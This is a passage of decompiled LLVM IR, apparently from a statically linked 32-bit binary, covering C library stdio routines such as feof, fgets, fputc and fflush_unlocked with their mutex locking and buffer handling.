  uselistorder i32 %v6_80513a7, { 1, 0 }
  uselistorder i32 %v1_8051389, { 1, 0 }
  uselistorder i32 %v0_80513a7.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_805136c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_8051363, { 1, 2, 0 }
  uselistorder i32 %v0_8051329, { 1, 0 }
  uselistorder i32 %v1_805131b, { 1, 0 }
  uselistorder i32 %v1_8051316, { 0, 1, 3, 2 }
  uselistorder i32 %v6_8051314, { 2, 0, 1 }
  uselistorder i32 %v0_8051336, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_80512d1, { 1, 2, 0 }
  uselistorder i32 %v0_80512a9, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_805129f, { 1, 2, 0 }
  uselistorder i32 %v6_805129d, { 0, 2, 1 }
  uselistorder i32 %v0_805129c, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_8051295, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_8051295, { 2, 1, 0 }
  uselistorder i32 %v1_805128d, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_8051278, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_8051273, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8051249, { 0, 2, 1 }
  uselistorder i32 %v0_8051236, { 2, 0, 1 }
  uselistorder i32 %v4_80511d0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 34, 30, 29, 31, 32, 35, 33, 41, 36, 37, 38, 39, 40, 42, 43 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 0, 2 }
  uselistorder i32 3840, { 4, 5, 6, 2, 3, 0, 1 }
  uselistorder i32 -5, { 2, 0, 1 }
  uselistorder i32 -134591863, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_805b581.224 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805158b, { 1, 0 }
  uselistorder label %dec_label_pc_8051588, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_805157c, { 1, 0 }
  uselistorder label %dec_label_pc_8051551, { 1, 0 }
  uselistorder label %dec_label_pc_8051516, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80514c2, { 1, 0 }
  uselistorder label %dec_label_pc_8051496, { 1, 0 }
  uselistorder label %dec_label_pc_80513fe, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80513cb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80513a2, { 1, 0 }
  uselistorder label %dec_label_pc_8051379, { 1, 0 }
  uselistorder label %dec_label_pc_8051340, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80512e3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805129d, { 1, 0 }
  uselistorder label %dec_label_pc_805129c, { 1, 0 }
  uselistorder label %dec_label_pc_8051283, { 1, 0 }
  uselistorder label %dec_label_pc_805126c, { 1, 0 }
  uselistorder label %dec_label_pc_805126c.outer, { 2, 0, 1 }
}

define i32 @feof(i32* %arg1) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_8051594 = load i32, i32* @edi, align 4
  %v0_8051595 = load i32, i32* @esi, align 4
  %v0_8051596 = load i32, i32* @ebx, align 4
  store i32 %tmp5, i32* @esi, align 4
  %v1_805159e = add i32 %tmp5, 52
  %v2_805159e = inttoptr i32 %v1_805159e to i32*
  %v3_805159e = load i32, i32* %v2_805159e, align 4
  store i32 %v3_805159e, i32* @edi, align 4
  %v1_80515a1 = icmp eq i32 %v3_805159e, 0
  %v1_80515a3 = icmp eq i1 %v1_80515a1, false
  br i1 %v1_80515a3, label %dec_label_pc_80515c4.thread, label %dec_label_pc_80515ca

dec_label_pc_80515c4.thread:                      ; preds = %entry
  br label %dec_label_pc_80515db

dec_label_pc_80515ca:                             ; preds = %entry
  %v1_80515a5 = add i32 %tmp5, 56
  store i32 %v1_80515a5, i32* @ebx, align 4
  %v4_80515b4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134540701, i32 %v1_80515a5)
  %v0_80515b9 = load i32, i32* @ebx, align 4
  %v1_80515bc = call i32 @pthread_mutex_lock(i32 %v0_80515b9)
  %v0_80515c4.pre = load i32, i32* @esi, align 4
  %v1_80515c4 = inttoptr i32 %v0_80515c4.pre to i32*
  %v2_80515c4 = load i32, i32* %v1_80515c4, align 4
  store i32 %v2_80515c4, i32* @ebx, align 4
  %v3_80515d3 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  br label %dec_label_pc_80515db

dec_label_pc_80515db:                             ; preds = %dec_label_pc_80515c4.thread, %dec_label_pc_80515ca
  %v0_80515db.in = phi i32* [ @ebx, %dec_label_pc_80515ca ], [ %arg1, %dec_label_pc_80515c4.thread ]
  %v0_80515db = load i32, i32* %v0_80515db.in, align 4
  %v1_80515e0 = and i32 %v0_80515db, 4
  store i32 %v0_8051596, i32* @ebx, align 4
  store i32 %v0_8051595, i32* @esi, align 4
  store i32 %v0_8051594, i32* @edi, align 4
  ret i32 %v1_80515e0

; uselistorder directives
  uselistorder i32 %tmp5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80515db, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_80515e8 = load i32, i32* @edi, align 4
  %v0_80515e9 = load i32, i32* @esi, align 4
  %v0_80515ea = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80515f2 = add i32 %arg3, 52
  %v2_80515f2 = inttoptr i32 %v1_80515f2 to i32*
  %v3_80515f2 = load i32, i32* %v2_80515f2, align 4
  store i32 %v3_80515f2, i32* @edi, align 4
  %v1_80515f5 = icmp eq i32 %v3_80515f2, 0
  %v1_80515f7 = icmp eq i1 %v1_80515f5, false
  br i1 %v1_80515f7, label %entry.dec_label_pc_8051618_crit_edge, label %dec_label_pc_80515f9

entry.dec_label_pc_8051618_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8051618

dec_label_pc_80515f9:                             ; preds = %entry
  %v1_80515f9 = add i32 %arg3, 56
  store i32 %v1_80515f9, i32* @ebx, align 4
  %v4_8051608 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134540701, i32 %v1_80515f9)
  %v0_805160d = load i32, i32* @ebx, align 4
  %v1_8051610 = call i32 @pthread_mutex_lock(i32 %v0_805160d)
  %v0_8051619.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051618

dec_label_pc_8051618:                             ; preds = %entry.dec_label_pc_8051618_crit_edge, %dec_label_pc_80515f9
  %v0_8051619 = phi i32 [ %arg3, %entry.dec_label_pc_8051618_crit_edge ], [ %v0_8051619.pre, %dec_label_pc_80515f9 ]
  %v0_8051618 = load i32, i32* @edx, align 4
  %v4_8051622 = inttoptr i32 %arg1 to i8*
  %v5_8051622 = call i32 @__GI_fgets_unlocked(i8* %v4_8051622, i32 %arg2, i32 %v0_8051619, i32 %v0_8051618)
  store i32 %v5_8051622, i32* @ebx, align 4
  br i1 %v1_80515f7, label %dec_label_pc_8051641, label %dec_label_pc_8051630

dec_label_pc_8051630:                             ; preds = %dec_label_pc_8051618
  %v3_8051639 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_8051644.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051641

dec_label_pc_8051641:                             ; preds = %dec_label_pc_8051618, %dec_label_pc_8051630
  %v0_8051644 = phi i32 [ %v5_8051622, %dec_label_pc_8051618 ], [ %v0_8051644.pre, %dec_label_pc_8051630 ]
  store i32 %v0_80515ea, i32* @ebx, align 4
  store i32 %v0_80515e9, i32* @esi, align 4
  store i32 %v0_80515e8, i32* @edi, align 4
  ret i32 %v0_8051644

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8051641, { 1, 0 }
  uselistorder label %dec_label_pc_8051618, { 1, 0 }
}

define i32 @__GI_fputc(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805164c = load i32, i32* @edi, align 4
  %v0_805164d = load i32, i32* @esi, align 4
  %v0_805164e = load i32, i32* @ebx, align 4
  %v12_805164f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v4_8051656 = sext i8 %arg1 to i32
  store i32 %v4_8051656, i32* @edi, align 4
  %v1_805165a = add i32 %arg2, 52
  %v2_805165a = inttoptr i32 %v1_805165a to i32*
  %v3_805165a = load i32, i32* %v2_805165a, align 4
  %v4_805165a = icmp eq i32 %v3_805165a, 0
  br i1 %v4_805165a, label %dec_label_pc_8051682, label %dec_label_pc_8051660

dec_label_pc_8051660:                             ; preds = %entry
  %v1_8051660 = add i32 %arg2, 16
  %v2_8051660 = inttoptr i32 %v1_8051660 to i32*
  %v3_8051660 = load i32, i32* %v2_8051660, align 4
  store i32 %v3_8051660, i32* %eax.global-to-local, align 4
  %v2_8051663 = add i32 %arg2, 28
  %v3_8051663 = inttoptr i32 %v2_8051663 to i32*
  %v4_8051663 = load i32, i32* %v3_8051663, align 4
  %v10_8051663 = icmp ult i32 %v3_8051660, %v4_8051663
  %v1_8051666 = icmp eq i1 %v10_8051663, false
  br i1 %v1_8051666, label %dec_label_pc_8051675, label %dec_label_pc_8051668

dec_label_pc_8051668:                             ; preds = %dec_label_pc_8051660
  store i32 %v4_8051656, i32* @edx, align 4
  %v3_805166a = inttoptr i32 %v3_8051660 to i8*
  store i8 %arg1, i8* %v3_805166a, align 1
  %v0_805166c = load i32, i32* %eax.global-to-local, align 4
  %v1_805166c = add i32 %v0_805166c, 1
  store i32 %v1_805166c, i32* %eax.global-to-local, align 4
  %v0_805166d = load i32, i32* @edx, align 4
  %v1_805166d = urem i32 %v0_805166d, 256
  store i32 %v1_805166d, i32* @ebx, align 4
  %v1_8051670 = load i32, i32* @esi, align 4
  %v2_8051670 = add i32 %v1_8051670, 16
  %v3_8051670 = inttoptr i32 %v2_8051670 to i32*
  store i32 %v1_805166c, i32* %v3_8051670, align 4
  br label %dec_label_pc_80516d5

dec_label_pc_8051675:                             ; preds = %dec_label_pc_8051660
  %v4_8051679 = call i32 @putc_unlocked(i8 %arg1, i32 %arg2)
  store i32 %v4_8051679, i32* %eax.global-to-local, align 4
  store i32 %v4_8051679, i32* @ebx, align 4
  br label %dec_label_pc_80516d2

dec_label_pc_8051682:                             ; preds = %entry
  %v1_8051682 = add i32 %arg2, 56
  store i32 %v1_8051682, i32* @ebx, align 4
  store i32 %v12_805164f, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v12_805164f, 16777216
  %v1_8051691 = sdiv i32 %sext, 16777216
  %v4_8051691 = inttoptr i32 %v1_8051691 to i32*
  %v5_8051691 = call i32 @__pthread_cleanup_push_defer(i32* %v4_8051691, i32 134540701, i32 %v1_8051682)
  store i32 %v5_8051691, i32* %eax.global-to-local, align 4
  %v0_8051696 = load i32, i32* @ebx, align 4
  %sext3 = mul i32 %v0_8051696, 16777216
  %v1_8051699 = sdiv i32 %sext3, 16777216
  %v2_8051699 = call i32 @pthread_mutex_lock(i32 %v1_8051699)
  store i32 %v2_8051699, i32* %eax.global-to-local, align 4
  %v0_805169e = load i32, i32* @esi, align 4
  %v1_805169e = add i32 %v0_805169e, 16
  %v2_805169e = inttoptr i32 %v1_805169e to i32*
  %v3_805169e = load i32, i32* %v2_805169e, align 4
  store i32 %v3_805169e, i32* %eax.global-to-local, align 4
  %v2_80516a4 = add i32 %v0_805169e, 28
  %v3_80516a4 = inttoptr i32 %v2_80516a4 to i32*
  %v4_80516a4 = load i32, i32* %v3_80516a4, align 4
  %v10_80516a4 = icmp ult i32 %v3_805169e, %v4_80516a4
  %v1_80516a7 = icmp eq i1 %v10_80516a4, false
  %v0_80516b9 = load i32, i32* @edi, align 4
  br i1 %v1_80516a7, label %dec_label_pc_80516b6, label %dec_label_pc_80516a9

dec_label_pc_80516a9:                             ; preds = %dec_label_pc_8051682
  store i32 %v0_80516b9, i32* %edx.global-to-local, align 4
  %v1_80516ab = trunc i32 %v0_80516b9 to i8
  %v3_80516ab = inttoptr i32 %v3_805169e to i8*
  store i8 %v1_80516ab, i8* %v3_80516ab, align 1
  %v0_80516ad = load i32, i32* %eax.global-to-local, align 4
  %v1_80516ad = add i32 %v0_80516ad, 1
  store i32 %v1_80516ad, i32* %eax.global-to-local, align 4
  %v0_80516ae = load i32, i32* %edx.global-to-local, align 4
  %v1_80516ae = urem i32 %v0_80516ae, 256
  store i32 %v1_80516ae, i32* @ebx, align 4
  %v1_80516b1 = load i32, i32* @esi, align 4
  %v2_80516b1 = add i32 %v1_80516b1, 16
  %v3_80516b1 = inttoptr i32 %v2_80516b1 to i32*
  store i32 %v1_80516ad, i32* %v3_80516b1, align 4
  br label %dec_label_pc_80516c4

dec_label_pc_80516b6:                             ; preds = %dec_label_pc_8051682
  %v5_80516b9 = trunc i32 %v0_80516b9 to i8
  %v4_80516ba = call i32 @putc_unlocked(i8 %v5_80516b9, i32 %v0_805169e)
  store i32 %v4_80516ba, i32* %eax.global-to-local, align 4
  store i32 %v4_80516ba, i32* @ebx, align 4
  br label %dec_label_pc_80516c4

dec_label_pc_80516c4:                             ; preds = %dec_label_pc_80516a9, %dec_label_pc_80516b6
  store i32 %v12_805164f, i32* %eax.global-to-local, align 4
  %v4_80516cd = call i32 @__pthread_cleanup_pop_restore(i32* %v4_8051691, i32 1)
  store i32 %v4_80516cd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80516d2

dec_label_pc_80516d2:                             ; preds = %dec_label_pc_8051675, %dec_label_pc_80516c4
  br label %dec_label_pc_80516d5

dec_label_pc_80516d5:                             ; preds = %dec_label_pc_8051668, %dec_label_pc_80516d2
  %v0_80516d8 = load i32, i32* @ebx, align 4
  store i32 %v0_80516d8, i32* %eax.global-to-local, align 4
  store i32 %v0_805164e, i32* @ebx, align 4
  store i32 %v0_805164d, i32* @esi, align 4
  store i32 %v0_805164c, i32* @edi, align 4
  ret i32 %v0_80516d8

; uselistorder directives
  uselistorder i32 %v0_80516b9, { 2, 1, 0 }
  uselistorder i32 %v12_805164f, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_80516d5, { 1, 0 }
  uselistorder label %dec_label_pc_80516d2, { 1, 0 }
  uselistorder label %dec_label_pc_80516c4, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v6_80516f4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134540701, i32 ptrtoint (i32* @global_var_80627f8.205 to i32))
  %v2_8051700 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80627f8.205 to i32))
  %v0_8051705 = load i32, i32* @global_var_806507c.206, align 4
  %v8_805170d = icmp eq i32 %v0_8051705, 1
  %v1_805170e = icmp eq i1 %v8_805170d, false
  br i1 %v1_805170e, label %dec_label_pc_80517a5, label %dec_label_pc_8051714

dec_label_pc_8051714:                             ; preds = %entry
  %v0_8051714 = load i32, i32* @global_var_8065080.207, align 128
  %tmp30 = icmp slt i32 %v0_8051714, 1
  br i1 %tmp30, label %dec_label_pc_80517a5, label %dec_label_pc_8051721

dec_label_pc_8051721:                             ; preds = %dec_label_pc_8051714
  store i32 0, i32* @esi, align 4
  %v6_8051733 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 134540701, i32 ptrtoint (i32* @global_var_80627e0.213 to i32))
  %v2_805173f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80627e0.213 to i32))
  %v0_8051744 = load i32, i32* bitcast (i32** @global_var_80627dc.184 to i32*), align 4
  store i32 %v0_8051744, i32* %edx.global-to-local, align 4
  %v1_80517865 = icmp eq i32 %v0_8051744, 0
  %v1_805178812 = icmp eq i1 %v1_80517865, false
  br i1 %v1_805178812, label %dec_label_pc_805174f, label %dec_label_pc_805178a

dec_label_pc_805174f:                             ; preds = %dec_label_pc_8051721, %dec_label_pc_8051784
  %v0_805175f = phi i32 [ %v0_8051784, %dec_label_pc_8051784 ], [ %v0_8051744, %dec_label_pc_8051721 ]
  %v1_805174f15 = inttoptr i32 %v0_805175f to i16*
  %v2_805174f = load i16, i16* %v1_805174f15, align 2
  %v1_8051757 = add i32 %v0_805175f, 32
  %v2_8051757 = inttoptr i32 %v1_8051757 to i32*
  %v3_8051757 = load i32, i32* %v2_8051757, align 4
  store i32 %v3_8051757, i32* @ebx, align 4
  %v1_8051752 = and i16 %v2_805174f, -32720
  %v6_805175a = icmp eq i16 %v1_8051752, 48
  br i1 %v6_805175a, label %dec_label_pc_8051763, label %dec_label_pc_805175f

dec_label_pc_805175f:                             ; preds = %dec_label_pc_805174f
  store i32 %v0_805175f, i32* @esi, align 4
  br label %dec_label_pc_8051784

dec_label_pc_8051763:                             ; preds = %dec_label_pc_805174f
  %v0_8051763 = load i32, i32* @esi, align 4
  %v1_8051763 = icmp eq i32 %v0_8051763, 0
  %v1_8051765 = icmp eq i1 %v1_8051763, false
  br i1 %v1_8051765, label %dec_label_pc_805176f, label %dec_label_pc_8051767

dec_label_pc_8051767:                             ; preds = %dec_label_pc_8051763
  store i32 %v3_8051757, i32* bitcast (i32** @global_var_80627dc.184 to i32*), align 4
  br label %dec_label_pc_8051772

dec_label_pc_805176f:                             ; preds = %dec_label_pc_8051763
  %v2_805176f = add i32 %v0_8051763, 32
  %v3_805176f = inttoptr i32 %v2_805176f to i32*
  store i32 %v3_8051757, i32* %v3_805176f, align 4
  %v0_8051772.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051772

dec_label_pc_8051772:                             ; preds = %dec_label_pc_8051767, %dec_label_pc_805176f
  %v0_805177b = phi i32 [ %v0_805175f, %dec_label_pc_8051767 ], [ %v0_8051772.pre, %dec_label_pc_805176f ]
  %v1_8051772 = add i32 %v0_805177b, 1
  %v2_8051772 = inttoptr i32 %v1_8051772 to i8*
  %v3_8051772 = load i8, i8* %v2_8051772, align 1
  %v4_8051772 = and i8 %v3_8051772, 32
  %v5_8051772 = icmp eq i8 %v4_8051772, 0
  br i1 %v5_8051772, label %dec_label_pc_8051784, label %dec_label_pc_8051778

dec_label_pc_8051778:                             ; preds = %dec_label_pc_8051772
  %v2_805177c = call i32 @free(i32 %v0_805177b)
  br label %dec_label_pc_8051784

dec_label_pc_8051784:                             ; preds = %dec_label_pc_8051772, %dec_label_pc_805175f, %dec_label_pc_8051778
  %v0_8051784 = load i32, i32* @ebx, align 4
  store i32 %v0_8051784, i32* %edx.global-to-local, align 4
  %v1_8051786 = icmp eq i32 %v0_8051784, 0
  %v1_8051788 = icmp eq i1 %v1_8051786, false
  br i1 %v1_8051788, label %dec_label_pc_805174f, label %dec_label_pc_805178a

dec_label_pc_805178a:                             ; preds = %dec_label_pc_8051784, %dec_label_pc_8051721
  %v4_8051793 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  store i32 0, i32* @global_var_8065080.207, align 128
  %v0_80517a5.pre = load i32, i32* @global_var_806507c.206, align 4
  br label %dec_label_pc_80517a5

dec_label_pc_80517a5:                             ; preds = %dec_label_pc_8051714, %entry, %dec_label_pc_805178a
  %v0_80517a5 = phi i32 [ %v0_8051705, %dec_label_pc_8051714 ], [ %v0_8051705, %entry ], [ %v0_80517a5.pre, %dec_label_pc_805178a ]
  %v1_80517aa = add i32 %v0_80517a5, -1
  store i32 %v1_80517aa, i32* @global_var_806507c.206, align 4
  %v4_80517b9 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  ret i32 %v4_80517b9

; uselistorder directives
  uselistorder i32 %v0_8051784, { 1, 2, 0 }
  uselistorder i32 %v0_805175f, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8051705, { 1, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder i32* bitcast (i32** @global_var_80627dc.184 to i32*), { 3, 4, 0, 1, 5, 6, 2, 7 }
  uselistorder label %dec_label_pc_80517a5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051784, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051772, { 1, 0 }
  uselistorder label %dec_label_pc_805174f, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_80517c4 = load i32, i32* @ebp, align 4
  %v0_80517c5 = load i32, i32* @edi, align 4
  %v0_80517c6 = load i32, i32* @esi, align 4
  %v0_80517c7 = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_80517cd = ptrtoint i16* %arg1 to i32
  store i32 %v4_80517cd, i32* @ebx, align 4
  %v10_80517d1 = icmp eq i16* %arg1, inttoptr (i32 134621148 to i16*)
  br i1 %v10_80517d1, label %dec_label_pc_80517e6, label %dec_label_pc_80517d9

dec_label_pc_80517d9:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_80517de = icmp eq i16* %arg1, null
  %v1_80517e0 = icmp eq i1 %v2_80517de, false
  br i1 %v1_80517e0, label %dec_label_pc_80518d5, label %dec_label_pc_80517e6

dec_label_pc_80517e6:                             ; preds = %dec_label_pc_80517d9, %entry
  store i32 0, i32* @edi, align 4
  %v2_80517f3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80517f3, i32* @ebx, align 4
  %v5_80517f8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 ptrtoint (i32* @global_var_80627f8.205 to i32))
  %v2_8051804 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80627f8.205 to i32))
  store i32 ptrtoint (i32* @global_var_80627f8.205 to i32), i32* @ecx, align 4
  %v0_805180a = load i32, i32* @global_var_806507c.206, align 4
  %v1_8051810 = add i32 %v0_805180a, 1
  store i32 %v1_8051810, i32* @global_var_806507c.206, align 4
  %v4_8051819 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v5_805182c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 ptrtoint (i32* @global_var_80627e0.213 to i32))
  %v2_8051838 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80627e0.213 to i32))
  %v4_8051848 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_80518ca2 = load i32, i32* @esi, align 4
  %v1_80518ca3 = icmp eq i32 %v0_80518ca2, 0
  %v1_80518cc10 = icmp eq i1 %v1_80518ca3, false
  br i1 %v1_80518cc10, label %dec_label_pc_8051852, label %dec_label_pc_80518ce

dec_label_pc_8051852:                             ; preds = %dec_label_pc_80517e6, %dec_label_pc_80518c7
  %v0_8051860 = phi i32 [ %v3_80518c7, %dec_label_pc_80518c7 ], [ %v0_80518ca2, %dec_label_pc_80517e6 ]
  %v1_8051852 = inttoptr i32 %v0_8051860 to i8*
  %v2_8051852 = load i8, i8* %v1_8051852, align 1
  %v3_8051852 = and i8 %v2_8051852, 64
  %v4_8051852 = icmp eq i8 %v3_8051852, 0
  br i1 %v4_8051852, label %dec_label_pc_80518c7, label %dec_label_pc_8051857

dec_label_pc_8051857:                             ; preds = %dec_label_pc_8051852
  %v0_8051857 = load i32, i32* @global_var_8062810.187, align 16
  %v9_8051857 = icmp eq i32 %v0_8051857, 2
  br i1 %v9_8051857, label %dec_label_pc_805187f, label %dec_label_pc_8051860

dec_label_pc_8051860:                             ; preds = %dec_label_pc_8051857
  %v1_8051860 = add i32 %v0_8051860, 56
  store i32 %v1_8051860, i32* @ebx, align 4
  %v5_805186f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 %v1_8051860)
  %v0_8051874 = load i32, i32* @ebx, align 4
  %v2_8051877 = call i32 @pthread_mutex_lock(i32 %v0_8051874)
  %v1_8051881.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805187f

dec_label_pc_805187f:                             ; preds = %dec_label_pc_8051857, %dec_label_pc_8051860
  %v0_8051891 = phi i32 [ %v0_8051860, %dec_label_pc_8051857 ], [ %v1_8051881.pre, %dec_label_pc_8051860 ]
  %v0_805187f = load i32, i32* @ebp, align 4
  %v2_8051881 = inttoptr i32 %v0_8051891 to i32*
  %v3_8051881 = load i32, i32* %v2_8051881, align 4
  %v4_8051881 = or i32 %v3_8051881, %v0_805187f
  %v2_8051883 = urem i32 %v4_8051881, 65536
  %v9_8051883 = and i32 %v2_8051883, 832
  %v2_8051887 = icmp eq i32 %v9_8051883, 320
  %v1_805188c = icmp eq i1 %v2_8051887, false
  br i1 %v1_805188c, label %dec_label_pc_80518ad, label %dec_label_pc_805188e

dec_label_pc_805188e:                             ; preds = %dec_label_pc_805187f
  %v2_8051892 = call i32 @__stdio_wcommit(i32 %v0_8051891)
  %v1_805189a = icmp eq i32 %v2_8051892, 0
  br i1 %v1_805189a, label %dec_label_pc_80518a3, label %dec_label_pc_805189e

dec_label_pc_805189e:                             ; preds = %dec_label_pc_805188e
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_80518ad

dec_label_pc_80518a3:                             ; preds = %dec_label_pc_805188e
  %v0_80518a3 = load i32, i32* @esi, align 4
  %v1_80518a3 = inttoptr i32 %v0_80518a3 to i16*
  %v2_80518a3 = load i16, i16* %v1_80518a3, align 2
  %v3_80518a3 = and i16 %v2_80518a3, -65
  store i16 %v3_80518a3, i16* %v1_80518a3, align 2
  %v0_80518a7 = load i32, i32* @esi, align 4
  %v1_80518a7 = add i32 %v0_80518a7, 8
  %v2_80518a7 = inttoptr i32 %v1_80518a7 to i32*
  %v3_80518a7 = load i32, i32* %v2_80518a7, align 4
  %v2_80518aa = add i32 %v0_80518a7, 28
  %v3_80518aa = inttoptr i32 %v2_80518aa to i32*
  store i32 %v3_80518a7, i32* %v3_80518aa, align 4
  br label %dec_label_pc_80518ad

dec_label_pc_80518ad:                             ; preds = %dec_label_pc_805187f, %dec_label_pc_805189e, %dec_label_pc_80518a3
  %v0_80518ad = load i32, i32* @global_var_8062810.187, align 16
  %v9_80518ad = icmp eq i32 %v0_80518ad, 2
  br i1 %v9_80518ad, label %dec_label_pc_80518c7, label %dec_label_pc_80518b6

dec_label_pc_80518b6:                             ; preds = %dec_label_pc_80518ad
  %v4_80518bf = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_80518c7

dec_label_pc_80518c7:                             ; preds = %dec_label_pc_80518ad, %dec_label_pc_8051852, %dec_label_pc_80518b6
  %v0_80518c7 = load i32, i32* @esi, align 4
  %v1_80518c7 = add i32 %v0_80518c7, 32
  %v2_80518c7 = inttoptr i32 %v1_80518c7 to i32*
  %v3_80518c7 = load i32, i32* %v2_80518c7, align 4
  store i32 %v3_80518c7, i32* @esi, align 4
  %v1_80518ca = icmp eq i32 %v3_80518c7, 0
  %v1_80518cc = icmp eq i1 %v1_80518ca, false
  br i1 %v1_80518cc, label %dec_label_pc_8051852, label %dec_label_pc_80518ce

dec_label_pc_80518ce:                             ; preds = %dec_label_pc_80518c7, %dec_label_pc_80517e6
  %v0_80518ce = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_80518fb

dec_label_pc_80518d5:                             ; preds = %dec_label_pc_80517d9
  store i32 0, i32* @edi, align 4
  %tmp25 = bitcast i16* %arg1 to i8*
  %v3_80518d7 = load i8, i8* %tmp25, align 1
  %v4_80518d7 = and i8 %v3_80518d7, 64
  %v5_80518d7 = icmp eq i8 %v4_80518d7, 0
  br i1 %v5_80518d7, label %dec_label_pc_80518fb, label %dec_label_pc_80518dc

dec_label_pc_80518dc:                             ; preds = %dec_label_pc_80518d5
  store i32 -1, i32* @edi, align 4
  %v2_80518e3 = call i32 @__stdio_wcommit(i32 %v4_80517cd)
  %v1_80518eb = icmp eq i32 %v2_80518e3, 0
  %v1_80518ed = icmp eq i1 %v1_80518eb, false
